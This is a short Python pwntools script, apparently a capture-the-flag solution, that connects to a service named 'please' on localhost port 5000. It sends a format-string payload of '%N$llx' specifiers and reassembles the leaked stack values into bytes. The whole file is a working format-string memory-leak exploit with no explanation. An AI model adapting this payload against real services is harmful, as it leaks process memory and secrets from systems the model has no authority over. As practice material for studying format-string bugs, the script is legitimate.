#!/usr/bin/env python3

from pwn import *

e = ELF("./bin/please")
context.binary = e

#p = process(e.path)
p = remote("localhost", 5000)

pay = "please;" 
cnt = 5
for i in range(cnt):
  pay += "%" + str(0x200 // 8 + 6 + i) + "$llx;"

p.sendlineafter("say", pay)
p.recvuntil(";")

leak = b""
for i in range(cnt):
  leak += p64(int(p.recvuntil(";", drop=True), 16))

print(leak)
